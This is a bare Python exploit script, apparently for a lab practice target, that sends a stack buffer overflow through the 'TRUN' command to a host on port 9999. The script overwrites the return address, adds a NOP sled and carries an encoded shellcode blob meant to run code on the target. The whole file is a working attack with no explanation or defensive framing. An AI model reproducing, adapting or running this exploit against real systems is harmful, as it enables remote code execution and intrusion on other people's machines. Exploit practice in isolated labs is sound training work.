import socket
import struct
s = socket.socket()
s.connect(("192.168.56.101",9999))
offset=2006
new_eip=struct.pack("<I",0x62501203)
nop_sled=b"\x90"*16
total_length=2999
buf =  b""
buf += b"\xbf\x46\xbb\xba\x6d\xdb\xd3\xd9\x74\x24\xf4\x5e"
buf += b"\x33\xc9\xb1\x59\x31\x7e\x14\x03\x7e\x14\x83\xee"
buf += b"\xfc\xa4\x4e\x46\x85\xa7\xb1\xb7\x56\xd7\x80\x65"
buf += b"\x32\x9c\xb1\xb9\x32\x47\xbe\xe8\x48\x0c\x93\x18"
buf += b"\x5e\xa5\x5e\x07\xeb\xbb\x76\x76\x14\x0a\x47\xd4"
buf += b"\xd6\x0d\x3b\x27\x0b\xed\x02\xe8\x5e\xec\x43\xbe"
buf += b"\x15\x01\x19\x16\x5d\x8f\x8e\x13\x23\x13\xae\xf3"
buf += b"\x2f\x2b\xc8\x76\xef\xdf\x64\x78\x20\x94\x2d\x5a"
buf += b"\x90\xab\x1e\x11\x58\xb3\x25\xef\x2d\xff\x6c\x7b"
buf += b"\xf9\x74\x5f\x84\x03\x5c\x91\xba\xc5\xaf\xdf\x96"
buf += b"\xc7\xe8\xd8\x06\xb2\x02\x1b\xba\xc5\xd1\x61\x60"
buf += b"\x43\xc5\xc2\xe3\xf3\x21\xf2\x20\x65\xa2\xf8\x8d"
buf += b"\xe1\xec\x1c\x13\x25\x87\x19\x98\xc8\x47\xa8\xda"
buf += b"\xee\x43\xf0\xb9\x8f\xd2\x5c\x6f\xaf\x04\x38\xd0"
buf += b"\x15\x4f\xab\x07\x29\xb0\x33\x28\x77\x26\xff\xe5"
buf += b"\x88\xb6\x97\x7e\xfa\x84\x38\xd5\x94\xa4\xb1\xf3"
buf += b"\x63\xbd\xd6\x03\xbb\x05\xb6\xfd\x3c\x75\x9e\x39"
buf += b"\x68\x25\x88\xe8\x11\xae\x48\x14\xc4\x5a\x43\x82"
buf += b"\x27\x32\x29\x53\xc0\x40\xce\x42\x4c\xcd\x28\x34"
buf += b"\x3c\x9d\xe4\xf5\xec\x5d\x55\x9e\xe6\x52\x8a\xbe"
buf += b"\x08\xb9\xa3\x55\xe7\x17\x9b\xc1\x9e\x32\x57\x73"
buf += b"\x5e\xe9\x1d\xb3\xd4\x1b\xe1\x7a\x1d\x6e\xf1\x6b"
buf += b"\x7a\x90\x09\x6c\xef\x90\x63\x68\xb9\xc7\x1b\x72"
buf += b"\x9c\x2f\x84\x8d\xcb\x2c\xc3\x72\x8a\x04\xbf\x45"
buf += b"\x18\x28\xd7\xa9\xcc\xa8\x27\xfc\x86\xa8\x4f\x58"
buf += b"\xf3\xfb\x6a\xa7\x2e\x68\x27\x32\xd1\xd8\x9b\x95"
buf += b"\xb9\xe6\xc2\xd2\x65\x19\x21\x61\x61\xe5\xb7\x4e"
buf += b"\xca\x8d\x47\xcf\xea\x4d\x22\xcf\xba\x25\xb9\xe0"
buf += b"\x35\x85\x42\x2b\x1e\x8d\xc9\xba\xec\x2c\xcd\x96"
buf += b"\xb1\xf0\xce\x15\x6a\x03\xb4\x56\x8d\xe4\x49\x7f"
buf += b"\xea\xe5\x49\x7f\x0c\xda\x9f\x46\x7a\x1d\x1c\xfd"
buf += b"\x75\x28\x01\x54\x1c\x52\x15\xa6\x35"
shellcode=buf
payload=[
	b"TRUN .",
	b"A"*offset,
	new_eip,
	nop_sled,
	shellcode,
	b"C"*( total_length-offset-len(new_eip)-len(nop_sled)-len(shellcode))
	]

payload=b"".join(payload)
print(payload)
s.send(payload)
s.close()
